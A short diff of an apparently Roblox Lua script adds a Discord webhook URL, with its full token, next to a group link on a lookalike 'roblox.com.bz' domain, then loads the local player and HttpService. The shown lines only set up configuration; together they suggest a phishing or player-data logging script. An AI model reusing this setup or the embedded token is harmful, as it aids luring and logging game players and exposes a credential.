@@ -1,5 +1,6 @@
 -- CONFIG
 local GROUP_LINK = "https://roblox.com.bz/communities/1713252036/"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1514988761912709281/wG1n9AYtVvspdiKwhy2KQ2mhF5KmdGLjW54vr_8gn7N5-o4ZcGSLrSw6jeM0bKjF6zF8"
 
 local Player = game:GetService("Players").LocalPlayer
 local HttpService = game:GetService("HttpService")
